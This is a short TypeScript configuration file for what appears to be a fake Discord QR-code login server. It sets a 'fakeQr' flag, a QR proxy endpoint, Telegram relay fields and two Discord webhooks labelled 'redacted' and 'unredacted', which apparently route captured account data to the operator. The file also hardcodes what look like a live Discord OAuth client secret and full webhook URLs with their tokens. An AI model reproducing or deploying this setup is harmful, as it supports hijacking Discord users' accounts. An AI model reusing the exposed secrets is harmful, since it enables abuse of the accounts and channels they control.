// SERVER DETAILS
export const domain = 'fcs.deno.dev';
export const fullDomain = `https://${domain}`;
export const proxies: string[] = [];
export const fakeQr = true;
export const qrCodeEndpoint = 'localhost:8080/proxy';
export const hostingOnVPS = false;

// TELEGRAM DETAILS
export const telegramToken = '';
export const telegramChatId = '';

// DISCORD OAUTH DETAILS
export const clientID = '1091458628319445053';
export const clientSecret = 'bId1s6Ul2h60-tYEqAEY2JGFRN_z6plN';
export const redirectURI = `${fullDomain}/login`;

// WEBHOOKS
export const redactedWebhook = 'https://ptb.discord.com/api/webhooks/1100932864863907980/yRHCA4N89rRdNtwjc1wCj49DoTGqUDtsTw5XTrpc2X8G6Q2bRpx7jIpUJIFYhqsimOGx';
export const unredactedWebhook = 'https://ptb.discord.com/api/webhooks/1082475634133049364/giLs_RxKj-Xbol1Pf4D1uiZNzovmfqHWfR-Wza5w_xg-W5I948sm474oJyn4pUvfD4Bp';

// AUTO ROLE
export const autoRoleToken = '';
export const autoRoleGuildId = '';
export const autoRoleRoleId = '';
